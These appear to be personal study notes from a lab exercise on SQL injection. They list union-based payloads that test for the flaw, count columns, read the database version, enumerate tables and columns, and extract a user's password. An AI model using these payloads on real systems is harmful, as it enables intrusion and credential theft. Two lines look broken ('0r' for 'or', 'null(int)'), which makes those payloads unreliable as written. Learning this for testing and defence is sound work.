#SQL 

Test for SQL injection by adding `'` and `"` after a query and if there is an error, may be vulnerable.

```
jeremy' or 1=1#
```

or

```
jeremy' 0r 1=1-- -
```
# Union

Can retrieve information from other tables and columns that are not initially defined.

May be hard to determine how many columns so use this technique to determine number of columns returned:

```
jeremy' union select null#
```

```
jeremy' union select null,null#
```

```
jeremy' union select null,null,null#
```

Now can query version of database:

```
jeremy' union select null,null,version()#
```

Query tables in database:

```
jeremy' union select null,null,table_name from information_schema.tables#
```

Query columns in database:

```
jeremy' union select null,null,column_name from information_schema.columns#
```

Now we can select jeremy's password:

```
jeremy' union select null,null,password from injection0x01#
```

Data in column may be integers (null would return errors) and may need to be specified as followed:

```
jeremy' union select null(int),1,null,password from injection0x01#
```
